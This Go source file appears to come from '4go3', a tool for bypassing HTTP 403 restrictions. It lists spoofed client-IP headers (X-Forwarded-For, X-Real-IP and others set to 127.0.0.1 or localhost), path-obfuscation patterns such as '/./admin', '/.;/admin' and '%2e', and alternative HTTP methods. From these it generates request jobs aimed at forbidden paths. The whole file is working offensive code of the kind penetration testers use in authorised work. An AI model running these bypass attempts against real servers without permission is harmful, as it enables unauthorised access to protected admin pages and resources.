package jobs

import (
	"fmt"
	"strings"

	"github.com/florran/4go3/internal/config"
)

var BypassHeaders = []map[string][]string{
	{"Client-IP": {"127.0.0.1"}},
	{"Forwarded-For-Ip": {"127.0.0.1"}},
	{"Forwarded-For": {"127.0.0.1"}},
	{"Forwarded-For": {"localhost"}},
	{"Forwarded": {"127.0.0.1"}},
	{"Forwarded": {"localhost"}},
	{"True-Client-IP": {"127.0.0.1"}},
	{"X-Client-IP": {"127.0.0.1"}},
	{"X-Custom-IP-Authorization": {"127.0.0.1"}},
	{"X-Forward-For": {"127.0.0.1"}},
	{"X-Forward": {"127.0.0.1"}},
	{"X-Forward": {"localhost"}},
	{"X-Forwarded-By": {"127.0.0.1"}},
	{"X-Forwarded-By": {"localhost"}},
	{"X-Forwarded-For-Original": {"127.0.0.1"}},
	{"X-Forwarded-For-Original": {"localhost"}},
	{"X-Forwarded-For": {"127.0.0.1"}},
	{"X-Forwarded-For": {"localhost"}},
	{"X-Forwarded-Server": {"127.0.0.1"}},
	{"X-Forwarded-Server": {"localhost"}},
	{"X-Forwarded": {"127.0.0.1"}},
	{"X-Forwarded": {"localhost"}},
	{"X-Forwared-Host": {"127.0.0.1"}},
	{"X-Forwared-Host": {"localhost"}},
	{"X-Host": {"127.0.0.1"}},
	{"X-Host": {"localhost"}},
	{"X-HTTP-Host-Override": {"127.0.0.1"}},
	{"X-Originating-IP": {"127.0.0.1"}},
	{"X-Real-IP": {"127.0.0.1"}},
	{"X-Remote-Addr": {"127.0.0.1"}},
	{"X-Remote-Addr": {"localhost"}},
	{"X-Remote-IP": {"127.0.0.1"}},
	{"Redirect": {"127.0.0.1"}},
	{"Referer": {"127.0.0.1"}},
	{"X-Forwarded-Host": {"127.0.0.1"}},
	{"X-Forwarded-Port": {"80"}},
	{"X-True-IP": {"127.0.0.1"}},
}

var PathBypassPatterns = []string{
	"%s/./%s",       // https://example.com/./admin
	"%s/../%s",      // https://example.com/../admin
	"%s/%%2e/%s",    // https://example.com/%2e/admin
	"%s/%s/",        // https://example.com/admin/
	"%s/%s%%20/",    // https://example.com/admin%20/
	"%s/;/%s",       // https://example.com/;/admin
	"%s/.;/%s",      // https://example.com/.;/admin
	"%s//;//%s",     // https://example.com//;//admin
	"%s//%s//",      // https://example.com//admin//
	"%s/%s.json",    // https://example.com/admin.json
	"%s/./%s/..",    // https://example.com/./admin/..
	"%s/*%s",        // https://example.com/*admin/
	"%s/%s*",        // https://example.com/admin/*
	"%s/%%2f%s",     // https://example.com/%2fadmin/
	"%s/%%2f%s%%2f", // https://example.com%2fadmin%2f
	"%s//%s/./",     // https://example.com//admin/./
	"%s///%s///",    // https://example.com///admin///
	"%s/%s/;/",      // https://example.com/;/admin/
	"%s//;//%s",     // https://example.com//;//admin/
}

var HttpMethods = [9]string{
	"GET",
	"POST",
	"PUT",
	"PATCH",
	"DELETE",
	"HEAD",
	"OPTIONS",
	"CONNECT",
	"TRACE",
}

type Job struct {
	BypassType string              //The type of bypass, (path, header or method)
	Bypass     string              //The actual bypass, (e.g., "Client-IP: 127.0.0.1" or https://example.com/../admin)
	URL        string              //URL to make the request to
	HttpMethod string              //HTTP method to use
	Headers    map[string][]string //Headers to include in the request
}

func GenerateJobs(userConfig config.Config) chan Job {
	jobs := make(chan Job, 1000)
	defaultPath := fmt.Sprintf("%s/%s", userConfig.URL, userConfig.Path)
	if userConfig.Path != "" {
		bypassPaths := GenerateBypassPaths(userConfig.URL, userConfig.Path)

		//Genrates path bypass jobs
		for _, url := range bypassPaths {
			job := Job{
				BypassType: "path",
				Bypass:     url,
				URL:        url,
				HttpMethod: "GET",
				Headers:    userConfig.Headers,
			}
			jobs <- job
		}

	}

	//Genrates header bypass jobs
	for _, header := range BypassHeaders {

		var bypassText string
		for key, values := range header {
			bypassText = fmt.Sprintf("%s: %s", key, strings.Join(values, ", "))
		}

		mergedHeaders := config.MergeHeaders(userConfig.Headers, header)
		job := Job{
			BypassType: "header",
			Bypass:     bypassText,
			URL:        defaultPath,
			HttpMethod: "GET",
			Headers:    mergedHeaders,
		}
		jobs <- job
	}

	//Genrates http method bypass jobs
	for _, method := range HttpMethods {
		job := Job{
			BypassType: "method",
			Bypass:     method,
			URL:        defaultPath,
			HttpMethod: method,
			Headers:    userConfig.Headers,
		}
		jobs <- job
	}

	close(jobs)
	return jobs
}

func GenerateBypassPaths(url string, path string) []string {

	var bypassPaths []string

	bypassPaths = append(bypassPaths, fmt.Sprintf("%s/%s", url, strings.ToUpper(path)))

	for _, pattern := range PathBypassPatterns {
		bypassPaths = append(bypassPaths, fmt.Sprintf(pattern, url, path))
	}
	return bypassPaths
}
